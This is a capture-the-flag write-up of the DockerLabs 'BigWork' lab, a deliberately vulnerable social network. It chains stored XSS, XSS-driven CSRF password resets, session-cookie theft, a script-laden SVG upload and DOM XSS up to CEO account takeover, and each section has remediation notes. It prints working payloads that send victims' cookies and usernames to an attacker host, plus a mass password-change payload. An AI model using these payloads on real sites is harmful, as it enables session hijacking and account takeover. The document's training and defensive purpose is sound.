// 01

Summary

BigWork is an Intermediate difficulty machine from DockerLabs. It simulates a LinkedIn-like corporate social network running on HTTP port 8000, purposely designed to practise real XSS attack scenarios. The application exposes five distinct vulnerabilities that chain together to escalate from an anonymous user all the way to full CEO account takeover and access to the company treasury.

The attack begins by exploiting a Stored XSS vulnerability in the comment section. From there, a CSRF flaw enables mass password resets across all users. Session cookies configured without HttpOnly allow direct cookie theft, bypassing MFA entirely. A malicious SVG file upload grants admin access. Finally, a DOM XSS via a reflected URL parameter delivers the CEO's session cookie and access to the restricted /treasury endpoint.

ID Vulnerability Impact CVSS
VULN-01 Stored XSS — Comments Mass JavaScript execution against all viewers High
VULN-02 CSRF — Password Change Mass account takeover via forced password reset High
VULN-03 Session Hijacking (HttpOnly=false) Full session theft bypassing MFA Critical
VULN-04 XSS via SVG Upload Admin session hijacking via file attachment High
VULN-05 DOM XSS — Reflected URL Parameter CEO session hijacking → treasury access High

// 02

VULN-01 · Stored XSS

Component BigWork — Post Comment Feature
Type Stored Cross-Site Scripting (XSS)
OWASP A03:2021 – Injection
CVSSv3 High
Scope All users viewing any post with a malicious comment

The BigWork application correctly sanitises input in the post-creation feature; however, it completely fails to sanitise or encode HTML/JavaScript submitted through the comment box. Any authenticated user can inject arbitrary HTML or JavaScript into a comment, which is stored in the database and rendered in the browser of every user who views that post — a textbook Stored (Persistent) XSS.

Because the payload is stored server-side, it fires automatically and persistently every time the post is loaded — no further interaction from the attacker is required.

1
Verify HTML rendering — discovery
COMMENT INPUT
# Submit as a comment on any post:
<b>test HTML</b>
✅ Result: text is rendered as bold — comments are NOT sanitised.
❌ Same payload in a post: displayed as plain text — posts ARE sanitised.
2
Deploy spy server and confirm live XSS
ATTACKER IP
$ hostname -I
SPY SERVER
$ python3 -m http.server 9999
XSS PAYLOAD
# Inject as a comment:
<img src=x onerror="fetch('http://192.168.0.28:9999/xss-test')">
# Spy server output — incoming requests from victims:
GET /xss-test HTTP/1.1 — 172.17.0.2
GET /xss-test HTTP/1.1 — 172.17.0.3
✅ Stored XSS confirmed active — every viewer triggers the payload.
3
Harvest victim usernames and roles
RECON PAYLOAD
<img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>new Image().src='http://192.168.0.28:9999/recon?user='+d.username+'&role='+d.role)">
GET /recon?user=patricia_navarro_19&role=user
GET /recon?user=roberto_sanchez_35&role=user
GET /recon?user=carlos_vega&role=user

// Remediation

Implement server-side output encoding for all user-generated content using a library such as DOMPurify or Python's markupsafe. Apply a strict Content Security Policy: default-src 'self'; script-src 'self' to prevent inline script execution. Treat all input surfaces with equal sanitisation rigour — the asymmetry between posts and comments was the root cause here.

// 03

VULN-02 · CSRF — Password Change

Component BigWork — /user/change-password endpoint
Type Cross-Site Request Forgery (CSRF) + Insecure Design
OWASP A01:2021 – Broken Access Control / A04:2021 – Insecure Design
CVSSv3 High
Prerequisite VULN-01 (active Stored XSS)

The password-change endpoint accepts a POST request with only the new_password field — it does not require the current password. Combined with the active Stored XSS, an attacker can inject a JavaScript payload that silently sends this POST on behalf of every authenticated viewer, effectively changing the passwords of all users without their knowledge.

4
Mass password change via XSS-driven CSRF
CSRF PAYLOAD
<img src=x onerror="fetch('/user/change-password',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'new_password=hacked123'})">
✅ Every user who views the post has their password silently changed to "hacked123".

// Remediation

Always require the current password before allowing a password change. Implement and validate CSRF tokens (synchronizer token pattern) on all state-changing endpoints. Set SameSite=Strict or SameSite=Lax on session cookies. Apply rate limiting on the endpoint to detect automated abuse.

// 04

VULN-03 · Session Hijacking

Component BigWork — Session Cookie Configuration
Type Session Hijacking / Insecure Cookie Attribute
OWASP A02:2021 – Cryptographic Failures / A07:2021 – Auth Failures
CVSSv3 Critical
Prerequisite VULN-01 (active Stored XSS)

The application's session cookie (session_id) is configured with HttpOnly: false. This means client-side JavaScript can read the cookie via document.cookie. Combined with the Stored XSS, an attacker can exfiltrate any victim's session token, completely bypassing MFA — because the stolen cookie represents an already-authenticated session, and the MFA challenge is only triggered at login time.

5
Steal session cookies via XSS
COOKIE STEAL
<img src=x onerror="new Image().src='http://192.168.0.28:9999/steal?cookie='+document.cookie">
# Spy server receives:
GET /steal?cookie=session_id=13dde2ee-6f89-4813-b2c6-291fda0e6fc4 HTTP/1.1
6
Inject stolen cookie — bypass MFA

Open DevTools in the browser, navigate to Application → Storage → Cookies → http://172.17.0.2:8000, edit the session_id value and paste the stolen token. Reload the page — we are now logged in as carlos_vega without knowing the password or the 4-digit MFA PIN.

// Remediation

Set HttpOnly=true on all session cookies — this single control prevents JavaScript from ever reading cookie values, making XSS-based session theft impossible. Additionally set Secure=true to prevent cookie transmission over plain HTTP. Implement session binding tied to IP and User-Agent, and fix the underlying XSS.

VULN-04 · XSS via SVG Upload

Component BigWork — Chat File Upload Feature
Type Stored XSS via Unrestricted File Upload (SVG)
OWASP A03:2021 – Injection / A04:2021 – Insecure Design
CVSSv3 High
Prerequisite VULN-03 (access to carlos_vega account)

The chat system allows users to send image files. The application does not validate the actual content of uploaded files, nor does it block SVG files. The SVG format is XML-based and natively supports embedded <script> tags. When a recipient opens a malicious SVG directly in the browser, the embedded JavaScript executes in the application's origin context, enabling cookie theft against administrator accounts.

7
Create and send malicious SVG to admin (Sofía)
foto.svg
# foto.svg — sent to Sofía Martínez (admin) via chat:
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">
<text x="10" y="50" font-size="12">Security Report Q4 2026</text>
<script type="text/javascript">
new Image().src='http://192.168.0.28:9999/admin?cookie='+document.cookie;
</script>
</svg>
# Sofía (simulated by a bot) opens the file — spy server receives:
GET /admin?cookie=session_id=13dde2ee-6f89-4813-b2c6-291fda0e6fc4 HTTP/1.1
 
✅ Inject Sofía's cookie → access /admin-panel as admin.

// Remediation

Whitelist allowed file types strictly — if SVG is not required, block it. If images are needed, only allow JPEG and PNG. Re-encode uploaded images server-side (e.g., using Pillow in Python) to strip any embedded metadata or scripts. Serve uploaded files from a separate isolated domain with no application cookies so any injected script cannot access session tokens.

VULN-05 · DOM XSS via URL Parameter

Component BigWork Admin Panel — Search (?q= parameter)
Type DOM-Based Cross-Site Scripting (Reflected)
OWASP A03:2021 – Injection
CVSSv3 High
Prerequisite VULN-04 (access to admin panel)

The admin panel reflects the value of the ?q= URL query parameter directly into the DOM without sanitisation. While server-side XSS filters block common payloads such as <script> tags, the application does not filter the onfocus event attribute. An attacker can craft a URL containing an <input> element with an onfocus handler and the autofocus attribute, which causes the injected code to execute automatically as soon as the page loads — no user interaction required beyond clicking the link.

8
Confirm DOM XSS — alert proof of concept
DOM XSS POC
/?q=<input onfocus="alert(1)" autofocus>
✅ Alert fires immediately on page load — DOM XSS confirmed.
9
Craft exploit URL — steal CEO session
EXPLOIT URL
# Send this URL in the admin chat — CEO bot clicks it:
http://192.168.0.28:9000/?%20q=%3Cinput%20onfocus%3D%22fetch('http://192.168.0.28:9999/admin?cookie='+document.cookie)%22%20autofocus%3E
# Spy server receives CEO's session cookie:
GET /admin?cookie=session_id=d7de81b8-a6e7-4687-ad7f-228b5efe65f HTTP/1.1
 
✅ Inject CEO cookie → navigate to /treasury → PWNED.

// Remediation

Never reflect raw URL parameters into the DOM. Use textContent instead of innerHTML, or a trusted sanitisation library. Extend XSS filters to cover all event handler attributes (onfocus, onmouseover, oninput, etc.) — not just <script> tags. Implement a strong Content Security Policy: script-src 'self' to block inline event handler execution. Treat internal admin panels with the same security rigour as public-facing interfaces.

Glossary

Stored XSS — Persistent Cross-Site Scripting
Stored XSS occurs when malicious JavaScript is saved to the server's database and later rendered in victims' browsers. Unlike Reflected XSS (which requires a victim to click a specially crafted link), Stored XSS fires automatically for every user who views the compromised page. It is classified under OWASP A03:2021 – Injection. Mitigations include server-side output encoding, Content Security Policy (CSP), and input validation on all user-controlled surfaces. The key distinction is that the payload is persistent — once injected, no further attacker action is needed.
CSRF — Cross-Site Request Forgery
CSRF is an attack where a malicious website or script causes a victim's browser to make an unintended request to a different site where the victim is authenticated. In this case, the XSS payload directly sends a POST request to the same domain, making CSRF tokens alone insufficient without first fixing the underlying XSS. Standard CSRF defences include: synchronizer tokens (CSRF tokens), SameSite=Strict cookie attribute, Origin and Referer header validation, and requiring the current password for sensitive operations.
HttpOnly Cookie Attribute
The HttpOnly flag, when set on a cookie, instructs the browser to prevent JavaScript from accessing the cookie value via document.cookie. This is one of the most impactful single security controls available for web applications: it makes XSS-based session hijacking impossible, since the attacker's injected script cannot read the session token. It does not protect against all XSS attack vectors (e.g., DOM manipulation or CSRF-via-XSS still work), so it should be combined with a robust CSP and input sanitisation. The complementary Secure flag prevents transmission of the cookie over unencrypted HTTP connections.
DOM XSS — Document Object Model Cross-Site Scripting
DOM XSS is a variant of XSS where the vulnerability exists in client-side code rather than server-side rendering. The attack payload is injected via a URL parameter or fragment, read by JavaScript (e.g., using location.search or location.hash), and written into the DOM via unsafe sinks such as innerHTML or document.write. In BigWork, the admin panel reads ?q= and injects it into the page without encoding. The autofocus attribute on an injected <input> element triggers the onfocus handler automatically on page load — no click required.
SVG — Scalable Vector Graphics as an Attack Vector
SVG files are XML-based vector graphics that natively support embedded <script> tags, event handlers (e.g., onload), and external resource references. When an SVG file is served directly from the web application's domain and opened in a browser, any embedded JavaScript executes in the origin's context — with full access to cookies and the DOM. Applications that allow SVG uploads without sanitisation or content-type checking are vulnerable to this vector. Defences include: whitelisting safe image formats (JPEG, PNG), sanitising SVG server-side, serving user uploads from a separate cookieless domain, and setting a strict CSP.
Content Security Policy (CSP)
CSP is an HTTP response header that instructs the browser which sources of content (scripts, styles, images, frames) are allowed to be loaded and executed. A strict CSP such as Content-Security-Policy: default-src 'self'; script-src 'self' blocks inline scripts and event handlers, neutralising virtually all XSS payloads even if they are injected into the page. CSP is a defence-in-depth measure — it does not replace input sanitisation, but it dramatically reduces the impact of any sanitisation failures that slip through. All five vulnerabilities in BigWork would have been significantly mitigated or rendered unexploitable with a properly configured CSP.
